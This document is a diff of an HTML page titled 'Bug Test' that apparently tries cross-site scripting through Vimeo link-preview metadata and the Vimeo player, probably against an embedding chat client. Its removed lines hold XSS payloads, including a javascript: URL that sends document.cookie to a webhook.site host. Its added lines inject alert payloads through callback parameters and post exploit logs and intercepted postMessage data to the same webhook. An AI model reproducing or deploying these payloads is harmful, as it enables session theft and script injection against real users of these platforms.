@@ -3,58 +3,43 @@
 <head>
     <meta property="og:site_name" content="Vimeo">
     <meta property="og:type" content="video.other">
-    <meta property="og:image" content="data:image/svg+xml,<svg onload=alert(document.domain)>">
-    <meta property="og:video:url" content="vimeo-player://player.vimeo.com/video/403530213?success=javascript:alert(1)">
+    <meta property="og:video:url" content="https://player.vimeo.com/video/403530213/config?callback=alert(1)">
+    <meta property="og:video:secure_url" content="https://player.vimeo.com/video/403530213?callback=alert(document.domain)">
     <meta property="og:video:type" content="text/html">
-    <meta property="og:video:width" content="99999999999999999">
+    <meta property="og:video:width" content="NaN">
     <meta property="og:video:height" content="-1">
     <title>Bug Test</title>
     <script>
     async function attemptExploit() {
         try {
-            // Test postMessage with different origins
-            ['https://discord.com', 'https://vimeo.com', '*'].forEach(origin => {
-                window.parent.postMessage({
-                    type: 'DISPATCH',
-                    payload: {
-                        url: 'javascript:alert(1)'
-                    }
-                }, origin);
-            });
-
-            // Test iframe sandbox escape
-            const frame = document.createElement('iframe');
-            frame.src = 'https://player.vimeo.com/video/403530213';
-            frame.sandbox = 'allow-scripts';
-            frame.onload = () => {
-                frame.contentWindow.postMessage({
-                    type: 'playerConfig',
-                    data: {
-                        url: 'javascript:fetch("https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124?"+document.cookie)'
-                    }
-                }, '*');
+            // Load Vimeo player API
+            const script = document.createElement('script');
+            script.src = 'https://player.vimeo.com/api/player.js';
+            script.onload = () => {
+                const player = new Vimeo.Player('vimeo-player', {
+                    url: 'https://player.vimeo.com/video/403530213',
+                    callback: 'alert(1)'
+                });
             };
-            document.body.appendChild(frame);
+            document.body.appendChild(script);
 
             // Log attempt
             fetch('https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124', {
                 method: 'POST',
                 body: JSON.stringify({
-                    type: 'exploit_attempted',
-                    url: location.href,
+                    type: 'callback_injection_attempted',
                     timestamp: new Date().toISOString()
                 })
-            });
+            }).catch(() => {});
 
         } catch(e) {
             fetch('https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124', {
                 method: 'POST',
                 body: JSON.stringify({
                     type: 'error',
-                    error: e.toString(),
-                    stack: e.stack
+                    error: e.toString()
                 })
-            });
+            }).catch(() => {});
         }
     }
 
@@ -62,11 +47,11 @@
         fetch('https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124', {
             method: 'POST',
             body: JSON.stringify({
-                type: 'message_received',
+                type: 'message',
                 origin: e.origin,
                 data: e.data
             })
-        });
+        }).catch(() => {});
     };
 
     window.onload = attemptExploit;
